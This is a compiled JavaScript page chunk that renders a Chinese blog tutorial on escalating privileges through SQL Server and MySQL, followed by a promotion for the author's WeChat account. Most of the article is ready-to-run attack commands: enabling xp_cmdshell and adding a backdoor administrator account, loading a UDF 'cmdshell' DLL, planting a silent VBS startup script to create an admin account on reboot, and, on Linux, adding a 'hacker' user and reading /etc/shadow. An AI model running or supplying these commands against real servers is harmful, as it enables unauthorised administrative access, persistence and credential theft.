(window.webpackJsonp=window.webpackJsonp||[]).push([[195],{486:function(s,a,t){"use strict";t.r(a);var n=t(7),e=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"数据库提权"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#数据库提权"}},[s._v("#")]),s._v(" 数据库提权")]),s._v(" "),a("h2",{attrs:{id:"sql-server提权"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sql-server提权"}},[s._v("#")]),s._v(" SQL Server提权")]),s._v(" "),a("p",[a("strong",[s._v("1.启用或关闭xp_cmdshell")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("--启用xp_cmdshell\nUSE master \nEXEC sp_configure "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'show advanced options'")]),s._v(", "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" \nRECONFIGURE WITH OVERRIDE \nEXEC sp_configure "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'xp_cmdshell'")]),s._v(", "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" \nRECONFIGURE WITH OVERRIDE \nEXEC sp_configure   "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'show advanced options'")]),s._v(", "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\nRECONFIGURE WITH OVERRIDE \n\n--关闭xp_cmdshell\nUSE master \nEXEC sp_configure "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'show advanced options'")]),s._v(", "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" \nRECONFIGURE WITH OVERRIDE \nEXEC sp_configure "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'xp_cmdshell'")]),s._v(", "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" \nRECONFIGURE WITH OVERRIDE \nEXEC sp_configure   "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'show advanced options'")]),s._v(", "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\nRECONFIGURE WITH OVERRIDE \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br")])]),a("p",[a("strong",[s._v("2.添加用户")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("Exec master.dbo.xp_cmdshell "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'net user liuyazhuang lyz123 /add'")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("3.将用户添加到管理员组")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("Exec master.dbo.xp_cmdshell "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'net localgroup administrators liuyazhuang /add'")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("4.通过xp_cmdshell exec查看系统用户")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("Exec master.dbo.xp_cmdshell "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'net user'")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("5.远程终端登录")])]),s._v(" "),a("p",[s._v("命令行运行mstsc打开远程终端，输入IP地址和刚才添加的用户名和密码，登录即可。")]),s._v(" "),a("p",[s._v("另外，通过数据库备份，将批处理命令备份到启动文件夹下，系统重启后就会自动执行批处理命令，也能达到提权的效果。")]),s._v(" "),a("h2",{attrs:{id:"mysql提权"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#mysql提权"}},[s._v("#")]),s._v(" MySQL提权")]),s._v(" "),a("p",[a("strong",[s._v("1.将udf.dll文件导出到默认的插件目录下")])]),s._v(" "),a("p",[a("strong",[s._v("2.UDF提权的常用命令")])]),s._v(" "),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("create")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" cmdshell "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("returns")]),s._v(" string "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("soname")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'udf.dll'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" cmdshell"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'net user liuyazhuang lyz123 /add'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" cmdshell"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'net localgroup administrators liuyazhuang /add'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" cmdshell"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'net localgroup administrators'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" cmdshell"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ipconfig/all'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" cmdshell"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'net user'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" cmdshell"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'regedit /s d:\\wwwroot\\3389.reg'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("drop")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" cmdshell"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" cmdshell"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'netstat -an'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("p",[a("strong",[s._v("3.VBS启动项")])]),s._v(" "),a("p",[s._v('先通过WebShell连接数据库，通过建立表a将VBS脚本写入表中，然后导入启动项。该脚本仅对中文版有效，如果使用其他语言版本的操作系统，仅需对"C:\\Documents and Settings\\All Users\\[开始]菜单\\程序\\启动\\a.vbs"这个脚本进行相应更改。在VBS脚本后面有一个"0"，表示不弹出CMD窗口，以静默模式运行。该方法是在通过UDF提权失败的情况下，将VBS插入启动项中，待系统重启后将自动添加一个用户，示例如下：')]),s._v(" "),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("create")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("table")]),s._v(" a "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("cmd "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("text")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("insert")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("into")]),s._v(" a "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("values")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"set wshshell=createobject(""wscript.shell"") "')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("insert")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("into")]),s._v(" a "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("values")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"a=wshshell.run(""cmd.exe /c net user liuyazhuang lyz123 /add"",0) "')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("insert")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("into")]),s._v(" a "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("values")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"b=wshshell.run(""cmd.exe /c net localgroup administrators liuyazhuang /add"",0) "')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" a "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("into")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("outfile")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"C:\\\\Documents and Settings\\\\All Users\\\\[开始]菜单\\\\程序\\\\启动\\\\a.vbs"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("h2",{attrs:{id:"linux下的mysql提权"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#linux下的mysql提权"}},[s._v("#")]),s._v(" Linux下的MySQL提权")]),s._v(" "),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[s._v("mysql "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("hlocalhost "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("uroot "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("p\nsystem useradd hacker\nsystem passwd hacker\nsystem tail "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("l "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("etc"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("passwd\nsystem tail "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("l "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("etc"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("shadow\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("h2",{attrs:{id:"写在最后"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),a("blockquote",[a("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);a.default=e.exports}}]);